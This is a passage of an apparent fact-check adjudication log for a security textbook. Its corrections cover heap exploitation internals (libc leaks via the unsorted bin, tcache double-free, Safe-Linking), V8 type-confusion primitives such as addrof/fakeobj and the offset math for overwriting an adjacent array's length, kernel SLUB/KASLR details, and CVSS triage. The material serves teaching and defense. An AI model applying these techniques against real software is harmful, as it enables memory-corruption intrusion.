   - **Adjudication**: Valid protocol accuracy fix. 65,536 bytes is the maximum payload size; adding the 8-byte header yields a total maximum packet size of 65,544 bytes. Dynamic heap allocation is the standard pattern for passing variable-length payloads across asynchronous pipelines.
   - **Surgical Fix**: Clarified payload maximum (`65,536 bytes` payload, `65,544 bytes` including 8-byte header) and standard dynamic heap allocation usage.
3. **Claim [3]**: `"ptmalloc2 先透過 brk 或 mmap 向作業系統核心取得大塊虛擬記憶體區域（稱為 Arena）。"`
   - **Adjudication**: Valid technical refinement. An Arena is an internal allocator management structure (containing mutexes, bins, and top chunk pointers) that manages virtual memory regions (heaps/brk data segments).
   - **Surgical Fix**: Updated wording to state that `ptmalloc2` manages virtual memory areas obtained from the kernel via Arena state structures.
4. **Claim [8]**: `"unsorted bin 的 fd/bk 指標則直接指向 libc.so.6 內的 main_arena 結構，讓攻擊者藉第 20 章推導過的固定 12-bit 頁內偏移還原整個 libc 與堆積基底位址。"`
   - **Adjudication**: Valid precision fix. The unsorted bin pointer points to the unsorted bin list head within the Arena structure in `libc.so.6`. Because its symbol offset relative to the libc base is fixed for a given libc build, leaking this pointer allows computing the full libc base address (not merely by a 12-bit page offset alone).
   - **Surgical Fix**: Clarified that `fd`/`bk` points to the unsorted bin head in `main_arena`, and because its offset relative to the libc base is fixed for a known version, it allows calculating the libc base address.
5. **Claim [13]**: `"因為所有 Chunk 總大小皆為 16 bytes（0x10）的整數倍，所以 mchunk_size 的最低 4 個位元必定為 0。"`
   - **Adjudication**: Valid bitfield representation fix. While unflagged raw physical sizes are 16-byte multiples (lowest 4 bits zero), the stored `mchunk_size` field reuses the lowest 3 bits (`0x7`) as `A`, `M`, and `P` flags.
   - **Surgical Fix**: Clarified that the unflagged raw size has lowest 4 bits as zero, and `ptmalloc2` stores size and flags together using the lowest 3 bits as status flags, restored via `size & ~0x7`.
6. **Claim [14]**: `"P == 1 表示前一個 Chunk 正在使用（或本 Chunk 為 Arena 的起點）。"`
   - **Adjudication**: Valid allocator state refinement. Chunks released into `tcache` or `fastbin` deliberately keep `P == 1` in the adjacent subsequent chunk to inhibit immediate backward consolidation.
   - **Surgical Fix**: Clarified that `P == 1` indicates the allocator considers the preceding physical chunk as in-use or in deferred-consolidation caches (`tcache`/`fastbin`), prohibiting backward coalescing.
7. **Claim [24]**: `"只有在系統呼叫 malloc_consolidate()（例如遇到超過 0x400 的大型請求或釋放大型區塊觸發整理）時，配置器才會把 fastbin 內的 Chunk 一次清空、清除對應 P 位元並合併送入 unsorted bin。"`
   - **Adjudication**: Valid accuracy fix. `malloc_consolidate()` is an internal allocator function, not a syscall; large requests `>= 0x400` trigger consolidation, and consolidated chunks may merge into unsorted bin or the Top Chunk.
   - **Surgical Fix**: Changed "系統呼叫" to "配置器內部呼叫", specified `>= 0x400`, and noted potential merging into the Top Chunk.
8. **Claim [25]**: `"如果程式在釋放一個 0x500 區塊後緊接著又請求一個 0x480 區塊，配置器在掃描 unsorted bin 時就能直接切割重用，省下放進 large bin 又立刻取出的成本。"`
   - **Adjudication**: Valid ptmalloc2 flow fix. During unsorted bin traversal in `_int_malloc`, chunks not satisfying exact match are sorted into their respective small or large bins before best-fit selection and remainder splitting.
   - **Surgical Fix**: Refined the description to explain exact-match reuse during unsorted bin scanning and sorting into small/large bins for subsequent best-fit splitting.
9. **Claim [29]**: `"假設函式為每筆封包配置一個 tlv_ctx_t（大小 0x20），另一個同尺寸的新物件 new_obj 也同屬 0x20 級距。"`
   - **Adjudication**: Valid chunk size math fix. If user request is 32 bytes (`0x20`), `request2size(32)` yields `0x30` (48 bytes). A chunk of size `0x20` corresponds to user requests `<= 24 bytes` (`0x18`).
   - **Surgical Fix**: Clarified that `tlv_ctx_t` has a request size of 24 bytes (`0x18`), which normalizes to a `0x20` chunk.
10. **Claim [30]**: `"在階段 B，如果程式透過懸垂指標 ctx 讀取 +0x10 或 +0x18，讀出的不再是應用程式欄位，而是 ptmalloc2 的指標。"`
    - **Adjudication**: Valid pointer offset and field naming fix. `ctx` points to the user data start (`chunk + 0x10`). `ctx + 0x00` reads the `next` pointer and `ctx + 0x08` reads `tcache_key`, which is a verification cookie rather than a pointer.
    - **Surgical Fix**: Distingushed chunk header offsets (`+0x10`, `+0x18`) from user pointer field offsets (`+0x00`, `+0x08`) and clarified that the second field is `tcache_key`.
11. **Claim [31]**: `"在沒有任何防護檢查的年代，若將同一塊記憶體 A 連續放入串列兩次（或穿插另一個區塊 B 形成 A → B → A），串列計數器會虛增，後續兩次 malloc() 會將同一塊記憶體同時分配給兩個看似獨立的呼叫端。"`
    - **Adjudication**: Valid LIFO queue traversal fix. For `A -> B -> A`, subsequent allocations return A, then B, then A again (the 1st and 3rd allocations return the same memory).
    - **Surgical Fix**: Corrected to state that the 1st and 3rd `malloc()` invocations return the same memory block `A`.
12. **Claim [32]**: `"向後看前塊的 P 位元與 prev_size，向前看後塊的再下一個區塊 P 位元。"`
    - **Adjudication**: Valid consolidation check direction fix. Backward consolidation inspects the *current* chunk's `P` bit and reads the *current* chunk's `prev_size` to find the previous chunk. Forward consolidation inspects the chunk following the next chunk.
    - **Surgical Fix**: Explicitly stated that backward coalescing checks the current chunk's `P` bit and `prev_size`, while forward coalescing checks the `P` bit of the chunk after next (or merges into Top).
13. **Claim [36]**: `"將 pos 右移 12 bits 會留下純粹受 ASLR 隨機化的 28-bit 分頁高位部分。"`
    - **Adjudication**: Valid bit-shift precision fix. Shifting right by 12 bits strips the 4 KiB page offset, leaving the page number (containing ASLR entropy and page prefix), rather than extracting an isolated 28-bit value.
    - **Surgical Fix**: Updated wording to state that right-shifting by 12 bits discards the 4 KiB page offset, leaving the high-order page number containing ASLR randomized bits.
14. **Claim [37]**: `"使缺乏資訊洩漏前提的盲目指標覆寫徹底失效。"`
    - **Adjudication**: Valid scoping fix. Safe-Linking drastically elevates the difficulty of blind pointer overwrites, but does not provide absolute authentication under all conceivable corruptions.
    - **Surgical Fix**: Adjusted claim to "大幅提升盲目指標覆寫難度，強制攻擊者必須先取得堆積位址洩漏".
15. **Claim [41]**: `"封裝安全釋放介面，強制在 free() 後立即將呼叫端的指標本身置為 NULL；在實驗中以 nexus_safe_free((void **)&ptr) 套用到 uint8_t * 指標。"`
    - **Adjudication**: Valid C typing and strict aliasing fix. Casting `uint8_t **` to `void **` and dereferencing violates C strict aliasing and pointer type safety.
    - **Surgical Fix**: Replaced function with a safe macro `#define NEXUS_SAFE_FREE(ptr) do { if ((ptr) != NULL) { free(ptr); (ptr) = NULL; } } while (0)` in text, lab instructions, and reference solution.
16. **Claim [42]**: `"每個 malloc() 分配區前後都會插入不可讀寫的 Redzone（影子位元組標記為負值 0xfa），任何越界 1 byte 的堆積溢位在存取當下就會觸發檢查失敗。"`
    - **Adjudication**: Valid ASan shadow memory mapping fix. ASan maps 8 bytes to 1 shadow byte; non-8-byte multiples record 1–7 valid bytes. Instrumented accesses hitting unaddressable shadow bytes trigger interception.
    - **Surgical Fix**: Accurately described the 1:8 shadow memory ratio and 1–7 partially accessible byte encoding alongside redzones.
17. **Claim [45]**: `"若需低開銷的生產期取樣偵測，可評估核心/glibc 搭配的 HWASan（ARM64 MTE/TBI）或 GWP-ASan（低頻率隨機取樣防護頁）。"`
    - **Adjudication**: Valid taxonomy distinction. HWASan uses compiler instrumentation and ARM64 TBI; Arm MTE is hardware memory tagging; and GWP-ASan samples guard pages.
    - **Surgical Fix**: Explicitly separated sampling guard pages (`GWP-ASan`), compiler instrumentation with TBI (`HWASan`), and hardware memory tagging (`Arm MTE`).

---

## 2. `ch26-jit-type-confusion-and-ubercage.md`

### `incorrect` Findings Adjudicated & Surgically Fixed (8/8)
1. **Claim [5]**: `"FixedArray（PACKED_ELEMENTS）裡面的每個槽位都是指標，引擎會直接把其中的位元當作 HeapObject 位址解參考。"`
   - **Adjudication**: Valid tagged value fix. `FixedArray` (`PACKED_ELEMENTS`) stores Tagged Values. Smi are decoded as integers; only HeapObject references are decoded as tagged pointers.
   - **Surgical Fix**: Clarified that `FixedArray` stores Tagged Values where Smi are interpreted as integers and HeapObject references as tagged pointers.
2. **Claim [11]**: `"編譯器將 i = Object.is(y, -0) ? -1 : 0 靜態摺疊為 i ∈ [0, 0]，但執行期仍可得到 i = -1。"`
   - **Adjudication**: Valid distinction between range inference and constant folding. If constant folding replaces the expression with `0`, the branch returning `-1` will not execute at runtime. The bug model requires incorrect range analysis annotation (`i ∈ [0, 0]`) while preserving the operational branch.
   - **Surgical Fix**: Clarified that the compiler erroneously annotates the range as `i ∈ [0, 0]` while retaining the runtime computation branch.
3. **Claim [12]**: `"Part A 的第一段計算說明，題設的執行期落差會覆寫相鄰陣列的 length，接著取得越界讀寫視窗。"`
   - **Adjudication**: Valid mathematical consistency fix. With `k = i * -6`, `k = 6`, giving an offset of `0x38`, whereas `adj.elements` and `length` are at `+0x30` and `+0x34`. Using `k = i * -5` yields `k = 5`, giving offset `0x08 + 5 * 8 = 0x30`, exactly spanning `0x30..0x37` and overwriting `adj.elements` (`+0x30`) and `adj.length` (`+0x34`).
   - **Surgical Fix**: Updated the scaling factor in Worked Example Part A to `k = i * -5`, proving exact mathematical alignment with `adj.elements` and `adj.length`.
4. **Claim [14]**: `"混用兩種後備陣列表示時，讀出 64 位元 float64 即可取得物件位址，反向讀取也會把受控的浮點數當作合法的 HeapObject 指標解參考。"`
   - **Adjudication**: Valid representation fix. In 32-bit pointer compression, an 8-byte float64 slot spans two 32-bit compressed pointer slots. Raw bit read/write requires splitting high/low 32-bit words and matching tagging rules.
   - **Surgical Fix**: Clarified the slot width correspondence (one 8-byte float64 slot corresponds to two 32-bit compressed slots) and tagging requirements for `addrof` and `fakeobj`.
5. **Claim [21]**: `"V8 Sandbox 假設攻擊者在 V8 堆積內有任意讀寫權限，並保證這份損毀無法傷及沙箱以外的宿主行程。"`
   - **Adjudication**: Valid scoping fix. The V8 Sandbox restricts in-cage corruption to within the 1 TiB boundary; host interface bugs and speculative execution may still present escape vectors.
   - **Surgical Fix**: Adjusted wording from "保證無法傷及沙箱以外" to "致力於將籠內記憶體損毀的影響約束於 1 TiB 沙箱邊界內，大幅提高逃逸至沙箱外宿主行程的難度".
6. **Claim [25]**: `"無沙箱環境中的引擎內部越界寫入，會直接暴露完整 64 位元虛擬位址空間與所有租戶資料。"`
   - **Adjudication**: Valid precision fix. Same-process execution increases blast radius; specific accessible data depends on mapped regions, permissions, and resident secrets.
   - **Surgical Fix**: Clarified that in unsandboxed environments, memory corruption occurs in the host's 64-bit virtual address space, substantially elevating the risk of compromising host memory and resident secrets.
7. **Claim [30]**: `"步驟 3 的程式輸出 opt1: 30 與 deopt: 3.5。"`
   - **Adjudication**: Valid output string fix. The script in Step 3 prints `console.log("最佳化後呼叫 (SMI):", ...)` and `console.log("型別改變後呼叫 (Double):", ...)`.
   - **Surgical Fix**: Updated Reference Answer 3 to show the exact prefix strings: `最佳化後呼叫 (SMI): 30` and `型別改變後呼叫 (Double): 3.5`.
8. **Claim [31]**: `"列出的容器命令驗證了 OS 行程／seccomp 隔離，且腳本即使逃逸也無法聯繫外部伺服器、寫入系統檔案或耗盡宿主 API 節點資源。"`
   - **Adjudication**: Valid demonstration description fix. The command demonstrates executing rules under resource and capability limits to minimize host exposure.
   - **Surgical Fix**: Described the container invocation as demonstrating the execution of rules under resource and capability constraints to minimize exposure.

---

## 3. `ch27-linux-kernel-exploitation.md`

### Findings Adjudicated (0 `incorrect`, 1 `imprecise`)
- **Review Summary**:
  - `claims`: 6 total (5 `correct`, 1 `imprecise`, 0 `incorrect`).
  - Claims 1–5: All baseline constants, SLUB 4 KiB allocation math (`kmalloc-192`, 21 objects/page, 4,032 bytes used), `CONFIG_SLAB_FREELIST_HARDENED` PTR_MANGLE arithmetic, KASLR 2 MiB alignment/entropy, and Self-Check question 1 verified 100% mathematically correct.
  - Claim 6 (`imprecise`): Historical release note details on Linux 6.6 / 6.8 Kconfig changes flagged under Pitfall #12 due to closed-book panelist source-evidence constraints.
- **Adjudication**: Dismissed with concurrence. Chapter technical derivations, code, and math are completely sound. Preserved verbatim.

---

## 4. `ch33-disclosure-and-bug-bounty.md`

### `incorrect` Findings Adjudicated & Surgically Fixed (5/5)
1. **Claim [4]**: `"若組織將該服務鎖在內網管理介面，即可透過 MAV:A 或 MAV:L 反映真實暴露面。"`
   - **Adjudication**: Valid CVSS v4.0 environmental vector fix. Internal network deployment alone does not imply `MAV:A` or `MAV:L` if the service remains reachable across routed internal IP networks (`MAV:N`).
   - **Surgical Fix**: Clarified that Modified Metrics apply when access is strictly constrained to adjacent networks (`MAV:A`) or local access (`MAV:L`).
2. **Claim [7]**: `"跨元件波及帳本則標為 Scope Changed（S:C）。"`
   - **Adjudication**: Valid CVSS v3.1 Scope definition fix. Scope Changed requires that the impacted downstream resource falls under a different security authority.
   - **Surgical Fix**: Added clarification that `S:C` applies when the impacted ledger resource is governed by a different security authority.
3. **Claim [16]**: `"EPSS ≥ 0.1 能讓工程團隊把有限的修復人力集中到最可能挨打的 5%–10% 資產上。"`
   - **Adjudication**: Valid scoping fix. EPSS 0.1 is the CVE probability threshold; asset percentage claims require specific inventory and scoring cross-reference.
   - **Surgical Fix**: Updated text to "提前把有限的修復人力集中到最可能被利用的高風險資產與關鍵破口上".
4. **Claim [31]**: `"任務二參考腳本能盤點 security.txt 與 GitHub 的 SECURITY.md，且僅做單次標準檔案讀取。"`
   - **Adjudication**: Valid script completeness fix. The original script only queried `security.txt` and lacked GitHub `SECURITY.md` inspection.
   - **Surgical Fix**: Enhanced Task 2 reference implementation to include `inspect_github_security_md(repo)` alongside `inspect_security_txt(domain)`.
5. **Claim [34]**: `"自我檢核第 2 題：漏洞 Y 應排入 24 小時 SLA；漏洞 X 因 EPSS 極低且環境上可透過 MAV 降級，優先序低於 Y。"`
   - **Adjudication**: Valid decision logic fix. In `decide_sla`, any CVSS score `>= 9.0` triggers the 24-hour SLA. Setting X's CVSS v4.0 base score to `8.5` (High, `< 9.0`) ensures that X defaults to 7-day SLA while Y (CVSS 7.5, EPSS 0.382) triggers the `EPSS >= 0.1` immediate disposition threshold to 24-hour SLA.
   - **Surgical Fix**: Aligned Self-Check Question 2 and Reference Answer 2 to specify X as CVSS v4.0 `8.5` (High), making the SLA triage deterministic and consistent with `decide_sla`.

### Linter Fixes Applied
- Fixed line 15 Pitfall #13 bold-flanking syntax: moved question mark outside `**`.
- Fixed lines 158 and 218: replaced "進行＋動作名詞" with direct verb phrases.
- Fixed line 290: replaced "在…的情況下" with "在…時".

---

## 5. `ch35-nexuspay-red-blue-capstone.md`

### `incorrect` Findings Adjudicated & Surgically Fixed (6/6)
1. **Claim [4]**: `"若資料庫交易僅使用預設 READ COMMITTED 且缺乏 SELECT ... FOR UPDATE 或原子性條件扣款，這 20 筆請求在檢查階段都會讀到 10,000 分餘額。"`
   - **Adjudication**: Valid concurrency timing precision fix. Arrival within `< 1 ms` maximizes overlap window, but whether all 20 requests read the stale balance depends on internal pool scheduling and transaction commit interleaving.
   - **Surgical Fix**: Clarified that dense arrival maximizes the overlapping window, allowing multiple concurrent requests to read the initial 10,000 cent balance.
2. **Claim [7]**: `"核心安全斷言：最多只有 2 筆成功（2 * 5,000 = 10,000），餘額嚴格為 0 且不可為負。"`
   - **Adjudication**: Valid test assertion logic fix. The test checks `expect(succeeded.length).toBeLessThanOrEqual(2)` and `succeeded.length * withdrawAmount + finalBalance === 10_000`. If 0, 1, or 2 requests succeed, the balance is 10,000, 5,000, or 0 cents respectively.
   - **Surgical Fix**: Updated comment to indicate that 0 to 2 requests may succeed, and final balance matches remaining funds and cannot be negative.
3. **Claim [8]**: `"驗證 20 筆併發提領在任何時序下皆不打破 10,000 分帳本不變量。"`
   - **Adjudication**: Valid scope fix. The unit/service test verifies a single parallel execution of 20 service-layer withdrawal calls.
   - **Surgical Fix**: Updated test suite description to specify a single execution of 20 parallel service-layer requests.
4. **Claim [17]**: `"Node.js 呼叫 libnexus-parse 前強制檢查 Buffer.byteLength <= 65536。"`
   - **Adjudication**: Valid packet size threshold fix. The 8-byte header plus 65,536-byte maximum payload yields an allowable total packet size of 65,544 bytes.
   - **Surgical Fix**: Updated check description in Stage 1 mitigation to enforce packet length `<= 65,544 bytes` and verify declared length against actual buffer size.
5. **Claim [20]**: `"當資料庫條件更新出現高頻率 affected_rows = 0……代表有人正在試探併發視窗；當安全 HTTP Client 攔截到……代表應用層已出現 SSRF 注入點；當 libnexus-parse 回傳 PayloadTooLarge……代表外部正有 Fuzzing 進行中。"`
   - **Adjudication**: Valid detection telemetry taxonomy fix. Telemetry signals indicate anomalies or policy denials, whose root causes require contextual correlation.
   - **Surgical Fix**: Rephrased statements as key telemetry and anomaly alert signals for policy denials and potential exploitation attempts.
6. **Claim [21]**: `"一旦跨越四層邊界形成利用鏈，實質影響便會直接跳升至需要 24 小時 緊急處置的嚴重等級（Critical，對應第 33 章 CVSS v4.0 + EPSS ≥ 0.1 分流標準）。"`
   - **Adjudication**: Valid triage criteria precision fix. Severity is rated via CVSS v4.0 vectors based on demonstrated impact, while 24-hour SLA triage depends on Critical severity, EPSS `>= 0.1`, or active exploitation.
   - **Surgical Fix**: Clarified that forming an end-to-end chain that breaches ledger conservation or exposes cloud credentials proves critical impact, qualifying for Critical rating and 24-hour emergency SLA under high-exploitation/active threat triggers.
